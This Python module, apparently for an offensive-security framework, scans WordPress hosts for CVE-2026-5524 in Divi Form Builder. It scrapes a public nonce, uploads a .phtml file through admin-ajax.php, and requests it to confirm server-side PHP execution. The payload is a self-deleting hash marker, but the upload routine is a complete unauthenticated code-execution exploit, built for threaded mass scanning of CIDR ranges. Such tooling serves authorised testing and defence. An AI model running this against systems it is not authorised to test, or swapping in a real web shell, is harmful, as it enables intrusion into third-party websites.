import hashlib
import re
import secrets
import ssl
import string
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar


FORM_PATHS = [
    "/",
    "/contact",
    "/contact-us",
    "/get-in-touch",
    "/quote",
    "/demo",
]

NONCE_PATTERN = re.compile(r'"fb_nonce"\s*:\s*"([a-f0-9]{10})"')

UPLOAD_DIR = "/wp-content/uploads/de_fb_uploads/"


@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""
    form_path: str = ""
    upload_url: str = ""


def _rand_token(n=8):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(n))


class DiviFormBuilderUploadScanner(Auxiliary):
    NAME = "Divi Form Builder Unauth File Upload Scanner (CVE-2026-5524)"
    DESCRIPTION = (
        "Detects the unauthenticated arbitrary file upload in Divi Form "
        "Builder <= 5.1.8. The module finds a page with the de_fb_obj "
        "JavaScript object, extracts the public fb_nonce, and uploads a "
        "harmless .phtml marker to de_fb_image_upload. If the uploaded file "
        "executes and returns the expected hash, the target is vulnerable. "
        "The uploaded file deletes itself on execution. Non-destructive — "
        "no shell, no persistence."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "critical"
    DISCLOSED = "2026-04-16"
    CHECK = True
    REFERENCES = [
        "CVE-2026-5524",
        "https://nvd.nist.gov/vuln/detail/CVE-2026-5524",
        "https://github.com/caterscam/CVE-2026-5524-PoC",
        "https://wpscan.com/vulnerability/CVE-2026-5524",
        "https://www.wordfence.com/threat-intel/vulnerabilities/id/cve-2026-5524",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=80, type=int, description="HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("FORM_PATH", default="",
               description="override the form page path (blank = auto-discover)"),
        Option("TIMEOUT", default=15.0, type=float, description="per-request timeout"),
        Option("THREADS", default=15, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _get(self, host, path):
        url = self._base(host) + path
        ctx = ssl._create_unverified_context()
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        req.add_header("Cache-Control", "no-cache")
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                return r.status, r.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace")

    def _post_upload(self, host, nonce, filename, payload):
        boundary = "----metis" + _rand_token(16)
        parts = []

        def field(name, value):
            parts.append("--" + boundary)
            parts.append('Content-Disposition: form-data; name="' + name + '"')
            parts.append("")
            parts.append(value)

        field("action", "de_fb_image_upload")
        field("fb_nonce", nonce)
        field("acceptFileTypes", "phtml")

        parts.append("--" + boundary)
        parts.append(
            'Content-Disposition: form-data; name="file"; filename="'
            + filename + '"'
        )
        parts.append("Content-Type: image/jpeg")
        parts.append("")
        parts.append(payload)
        parts.append("--" + boundary + "--")
        parts.append("")

        body = "\r\n".join(parts).encode()

        url = self._base(host) + "/wp-admin/admin-ajax.php"
        ctx = ssl._create_unverified_context()
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
        req.add_header("Origin", self._base(host))
        req.add_header("Referer", self._base(host) + "/")
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                return r.status, r.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace")

    def _find_form_page(self, host):
        override = self.options["FORM_PATH"].strip()
        if override:
            paths = [override if override.startswith("/") else "/" + override]
        else:
            paths = FORM_PATHS

        for path in paths:
            try:
                st, body = self._get(host, path)
            except urllib.error.URLError:
                continue
            if st != 200:
                continue
            if "de_fb_obj" not in body or "fb_nonce" not in body:
                continue
            m = NONCE_PATTERN.search(body)
            if m:
                return path, m.group(1)
        return None, None

    def _probe(self, host):
        result = HostResult(host=host)

        try:
            form_path, nonce = self._find_form_page(host)
        except urllib.error.URLError as e:
            result.detail = type(e).__name__
            return result

        if not form_path:
            result.detail = "no Divi form page found"
            return result

        result.form_path = form_path

        marker = _rand_token(16)
        marker_hash = hashlib.md5(marker.encode()).hexdigest()
        filename = _rand_token(8) + ".phtml"
        payload = "<?php echo md5('" + marker + "');unlink(__FILE__);?>"

        try:
            st, body = self._post_upload(host, nonce, filename, payload)
        except urllib.error.URLError as e:
            result.detail = "upload: " + type(e).__name__
            return result

        if st != 200 or filename not in body:
            result.detail = "upload rejected (HTTP " + str(st) + ")"
            return result

        upload_url = UPLOAD_DIR + filename
        result.upload_url = upload_url

        try:
            st, body = self._get(host, upload_url)
        except urllib.error.URLError:
            result.detail = "upload succeeded, execution unverified"
            return result

        if marker_hash in body:
            result.state = "vulnerable"
            result.detail = ".phtml executed (marker " + marker_hash[:12] + ")"
            return result

        result.detail = "upload succeeded but .phtml did not execute"
        return result

    def _record_host_result(self, h):
        svc_name = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name=svc_name, banner="WordPress/Divi",
        )
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            refs="CVE-2026-5524",
            info=h.detail + " | " + h.upload_url,
        )
        if h.upload_url:
            self.note(
                "divi_upload=" + h.upload_url,
                address=h.host,
                kind="divi_upload",
            )

    def check(self):
        targets = self._expand_targets()
        host = targets[0]
        print(colors.info("check: probing " + self._base(host)))

        r = self._probe(host)

        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            print(colors.dimmed("  form: " + r.form_path))
            return CheckResult.VULNERABLE

        if r.detail == "no Divi form page found":
            print(colors.safe("check: " + host + " no Divi form found"))
            return CheckResult.SAFE

        if "executed" in r.detail:
            print(colors.warn("check: " + host + " " + r.detail))
            return CheckResult.UNKNOWN

        print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
        return CheckResult.SAFE

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info("scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"))
        print(colors.dimmed("  uploads a marker .phtml that unlinks itself on execution"))

        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue

                    if r.state == "vulnerable":
                        hits.append(r)
                        bar.log(colors.vuln(r.host + " - " + r.detail))
                        if workspace_active:
                            self._record_host_result(r)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.detail and "no Divi form" in r.detail:
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.yellow(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                print("    " + colors.vuln(h.host) + "  " + colors.dimmed(h.detail))
                print("      " + colors.session(h.upload_url))

        return hits
